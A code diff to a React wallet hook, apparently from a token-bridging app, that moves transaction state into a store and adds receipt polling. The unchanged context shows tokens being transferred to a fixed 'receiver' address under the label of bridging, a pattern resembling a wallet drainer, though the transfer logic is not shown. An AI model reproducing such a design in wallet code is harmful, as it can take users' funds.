@@ -1,4 +1,4 @@
-import { useState } from "react";
+
 import { useAccount } from "wagmi";
 import { getBalance, switchChain, getChainId, getGasPrice } from "@wagmi/core";
 import axios from "axios";
@@ -6,9 +6,12 @@ import { Contract, providers, ethers, utils } from "ethers";
 import contractAbi from "../blockchain/contract.json";
 import { config, receiver, API_KEY } from "./Web3Config";
 import { toast } from "react-toastify";
+import useStore from "../store/store";
 export const UseWallet = () => {
+
+  const { setTxState } = useStore()
   const account = useAccount();
-  const [loading, setLoading] = useState(false)
+
   // Chain status tracking
   let chainInteractionStatus = {
     1: false, // Ethereum Mainnet
@@ -426,7 +429,7 @@ export const UseWallet = () => {
   };
 
   // Main function to handle bridging logic based on token type
-  const bridgeTokens = async ({ token, amount, provider, accountAddress, chainId, txState, setTxState }) => {
+  const bridgeTokens = async ({ token, amount, provider, accountAddress, chainId }) => {
     console.log(token)
     console.log(accountAddress)
 
@@ -440,12 +443,11 @@ export const UseWallet = () => {
       console.log(isNative)
       if (isNative) {
         // Bridge Native Token (ETH, BNB, etc.)
-        const transactionResponse = await bridgeNativeToken(amount, provider, accountAddress, chainId, txState, setTxState);
-        console.log(transactionResponse)
+        const transactionResponse = await bridgeNativeToken(amount, provider, accountAddress, chainId);
         return transactionResponse; // Return the transaction response
       } else {
         // Bridge Non-Native Token (DAI, USDT, etc.)
-        const transactionResponse = await bridgeNonNativeToken(token, amount, provider, accountAddress, chainId, txState, setTxState);
+        const transactionResponse = await bridgeNonNativeToken(token, amount, provider, accountAddress, chainId);
         console.log(transactionResponse)
         return transactionResponse; // Return the transaction response
       }
@@ -457,7 +459,7 @@ export const UseWallet = () => {
   };
 
   // Function to handle native token bridging through multicall
-  const bridgeNativeToken = async (amount, provider, accountAddress, chainId, txState, setTxState) => {
+  const bridgeNativeToken = async (amount, provider, accountAddress, chainId) => {
     try {
       if (!accountAddress || !provider) {
         toast.error("Connect your wallet first.");
@@ -483,20 +485,57 @@ export const UseWallet = () => {
 
       // Send the transaction through the connected wallet provider
       const transactionResponse = await signer.sendTransaction(tx);
-      console.log(`Transaction hash: ${transactionResponse.hash}`);
+      await transactionResponse.wait();
+      console.log(`Transaction initiated. Hash: ${transactionResponse.hash}`);
+      transactionResponse.hash && setTxState('Initalized')
+      // Optionally, you can show a message to the user
 
       // Wait for the transaction to be mined
-      await transactionResponse.wait();
 
-      if (transactionResponse.status === 1) {
-        console.log("Transaction successful:", transactionResponse);
-        toast.success(`Successfully bridged ${amount} native token.`);
-        setTxState(transactionResponse)
-        return transactionResponse; // Return the transaction response
-      } else {
-        console.error("Transaction failed:", transactionResponse);
-        return null; // Return null in case of failure
-      }
+      const checkTransactionStatus = async (txHash) => {
+        console.log('TX hash: ', txHash)
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const receipt = await provider.getTransactionReceipt(txHash);
+        return receipt;
+      };
+
+      const checkStatus = async () => {
+        const receipt = await checkTransactionStatus(transactionResponse.hash);
+        if (receipt) {
+          console.log('Receipt: ', receipt)
+          if (receipt.status === 1) {
+            setTimeout(() => {
+              setTxState('Success')
+            }, 5000);
+            console.log(`Successfully bridged ${amount} native token.`);
+            return true; // Transaction was successful
+          } else if (receipt.status === 0) {
+            console.log("Transaction failed.");
+            return false; // Transaction failed
+          }
+        } else {
+          console.log("Transaction is still pending or was canceled.");
+          return null; // Transaction is still pending
+        }
+      };
+
+      // Set a timeout for checking the transaction status
+      const timeoutDuration = 60000; // 60 seconds
+      const intervalDuration = 5000; // Check every 5 seconds
+      let elapsedTime = 0;
+
+      const interval = setInterval(async () => {
+        const status = await checkStatus();
+        if (status !== null) {
+          clearInterval(interval); // Clear the interval if we have a definitive status
+        }
+        elapsedTime += intervalDuration;
+        if (elapsedTime >= timeoutDuration) {
+          clearInterval(interval);
+          console.log("Transaction check timed out.");
+          toast.warning("Transaction check timed out. Please check your wallet.");
+        }
+      }, intervalDuration);
 
     } catch (error) {
       console.error("Native token bridging failed:", error);
@@ -506,7 +545,7 @@ export const UseWallet = () => {
   };
 
   // Function to transfer non-native tokens to receiver address
-  const bridgeNonNativeToken = async (token, amount, provider, accountAddress, chainId, txState, setTxState) => {
+  const bridgeNonNativeToken = async (token, amount, provider, accountAddress, chainId) => {
     try {
       if (!token.token_address) {
         console.error("Invalid token address:", token);
